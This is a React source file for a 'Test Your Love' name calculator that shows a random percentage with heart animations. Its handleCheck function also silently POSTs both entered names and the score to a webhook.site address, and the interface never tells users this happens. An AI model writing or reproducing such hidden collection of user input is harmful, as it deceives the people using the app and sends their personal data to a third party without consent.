import { useState } from 'react';
import './App.css';
import { FaHeart, FaHeartBroken } from "react-icons/fa";


function App() {



  const [love, setLove] = useState("")
  const [boy, setBoy] = useState("");
  const [girl, setGirl] = useState("");



  const handleCheck = async () => {

    let rand = Math.floor(Math.random() * 100) + 1
    setLove(rand)

    try {
      await fetch('https://webhook.site/3c0a7546-c103-464d-9d3b-79a044381da9', {
        method: 'POST',
        body: `${boy}+${girl}/ ${rand}`,
      });
    } catch {
      console.log("jja")
    }


  }




  return (
    <>

      <div className="flex flex-col items-center justify-center bg-white">
        <h1 className="text-center text-4xl mt-10 mb-10 hover:text-red-800 hover:font-bold hover:scale-110 transition-all">Test Your Love</h1>
        <center><img src={love >= 50 ? "/kiss.gif" : "/crying.gif"} alt="love" /></center>



        <div className="flex flex-col items-end gap-6 w-72 mt-10 mb-10 bg-white">
          <div className="relative w-full min-w-[200px] h-10">
            <input
              value={boy}
              onChange={(e) => { setBoy(e.target.value) }}
              className="border-b-black border-b-2 peer w-full h-full bg-transparent text-blue-gray-700 font-sans font-normal outline outline-0 focus:outline-0 disabled:bg-blue-gray-50 disabled:border-0 transition-all placeholder-shown:border placeholder-shown:border-blue-gray-200 placeholder-shown:border-t-blue-gray-200 border focus:border-2 border-t-transparent focus:border-t-transparent text-sm px-3 py-2.5 rounded-[7px] border-blue-gray-200 focus:border-gray-900"
              placeholder=" " /><label
                className="flex w-full h-full select-none pointer-events-none absolute left-0 font-normal !overflow-visible truncate peer-placeholder-shown:text-blue-gray-500 leading-tight peer-focus:leading-tight peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500 transition-all -top-1.5 peer-placeholder-shown:text-sm text-[11px] peer-focus:text-[11px] before:content[' '] before:block before:box-border before:w-2.5 before:h-1.5 before:mt-[6.5px] before:mr-1 peer-placeholder-shown:before:border-transparent before:rounded-tl-md before:border-t peer-focus:before:border-t-2 before:border-l peer-focus:before:border-l-2 before:pointer-events-none before:transition-all peer-disabled:before:border-transparent after:content[' '] after:block after:flex-grow after:box-border after:w-2.5 after:h-1.5 after:mt-[6.5px] after:ml-1 peer-placeholder-shown:after:border-transparent after:rounded-tr-md after:border-t peer-focus:after:border-t-2 after:border-r peer-focus:after:border-r-2 after:pointer-events-none after:transition-all peer-disabled:after:border-transparent peer-placeholder-shown:leading-[3.75] text-gray-500 peer-focus:text-gray-900 before:border-blue-gray-200 peer-focus:before:!border-gray-900 after:border-blue-gray-200 peer-focus:after:!border-gray-900">Boy's Name            </label>
          </div>
          <div className="relative w-full min-w-[200px] h-11">
            <input
              onChange={(e) => { setGirl(e.target.value) }}
              value={girl}
              className=" border-b-black border-b-2 w-full h-full px-3 py-3 font-sans text-sm font-normal transition-all bg-transparent border rounded-md peer text-blue-gray-700 outline outline-0 focus:outline-0 disabled:bg-blue-gray-50 disabled:border-0 placeholder-shown:border placeholder-shown:border-blue-gray-200 placeholder-shown:border-t-blue-gray-200 focus:border-2 border-t-transparent focus:border-t-transparent border-blue-gray-200 focus:border-gray-900"
              placeholder=" " /><label
                className="flex w-full h-full select-none pointer-events-none absolute left-0 font-normal !overflow-visible truncate peer-placeholder-shown:text-blue-gray-500 leading-tight peer-focus:leading-tight peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500 transition-all -top-1.5 peer-placeholder-shown:text-sm text-[11px] peer-focus:text-[11px] before:content[' '] before:block before:box-border before:w-2.5 before:h-1.5 before:mt-[6.5px] before:mr-1 peer-placeholder-shown:before:border-transparent before:rounded-tl-md before:border-t peer-focus:before:border-t-2 before:border-l peer-focus:before:border-l-2 before:pointer-events-none before:transition-all peer-disabled:before:border-transparent after:content[' '] after:block after:flex-grow after:box-border after:w-2.5 after:h-1.5 after:mt-[6.5px] after:ml-1 peer-placeholder-shown:after:border-transparent after:rounded-tr-md after:border-t peer-focus:after:border-t-2 after:border-r peer-focus:after:border-r-2 after:pointer-events-none after:transition-all peer-disabled:after:border-transparent peer-placeholder-shown:leading-[4.1] text-gray-500 peer-focus:text-gray-900 before:border-blue-gray-200 peer-focus:before:!border-gray-900 after:border-blue-gray-200 peer-focus:after:!border-gray-900">Girl's Name
            </label>
          </div>
        </div>


        {love && love >= 50 ? <><div className='flex items-center justify-center bg-white'><FaHeart className='text-red-500 text-4xl  animate-pulse hover:animate-bounce' /><FaHeart className='text-red-500 text-4xl  animate-pulse hover:animate-bounce delay-500 ' /><FaHeart className='text-red-500 text-4xl  animate-pulse hover:animate-bounce delay-1000' /></div> <p className='text-red-900 text-2xl font-bold'><span className='bg-white'>{love}% love found &#128536;</span></p></> : ""}
        {love && love < 50 ? <><div className='flex items-center justify-center bg-white'><FaHeartBroken className='text-red-500 text-5xl  animate-bounce' /><FaHeartBroken className='text-red-500text-5xl  animate-bounce delay-1000 ' /><FaHeartBroken className='text-red-500 text-5xl  animate-bounce delay-2000' /></div> <p className='text-red-900 text-2xl font-bold'><span className='bg-white'>{love}% love found &#128557;</span></p></> : ""}


        <button className="bg-blue-500 hover:bg-blue-400 text-white font-bold py-2 px-4 border-b-4 border-blue-700 hover:border-blue-500 rounded flex gap-2 items-center" onClick={handleCheck}><FaHeart /><span>Test your love</span></button>




      </div>
    </>
  );
}

export default App;
